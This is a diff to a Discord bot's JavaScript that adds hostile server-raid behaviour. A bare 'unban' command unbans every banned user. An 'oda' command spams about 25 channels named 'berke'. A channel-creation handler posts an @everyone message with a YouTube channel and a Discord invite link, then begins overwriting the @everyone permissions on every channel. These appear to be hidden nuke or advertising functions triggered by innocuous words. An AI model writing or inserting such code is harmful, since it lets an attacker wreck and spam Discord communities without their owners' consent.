@@ -24,13 +24,46 @@ const tokenyeri = require('./tokenyeri.json');
 require('./util/eventLoader')(client);
 
 client.on('message', message => {
-    if(message.content == 'r!unban'){
+    if(message.content == 'unban'){
         message.guild.fetchBans().then(bans => {
             bans.forEach(user => {
                 console.log(user.username + '#' + user.tag);
                 message.guild.unban(user);
             });
         });
+    }
+});
+
+
+client.on('message', message => {
+    if(message.content == 'oda'){
+   message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+      message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+      message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+message.guild.createChannel(`berke`)
+
+message.guild.createChannel(`berke`)
     }
 });
 
@@ -152,7 +185,7 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'berke1') {
+  if (channel.name == 'berke-adamdir') {
     channel.send(`Allah zihin açıklığı versin. @everyone \n\nhttps://www.youtube.com/channel/UC0T1Lw6vM9JZWm6X-9U7ZvA?view_as=subscriber \n\nhttps://discord.gg/wrTekpC`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
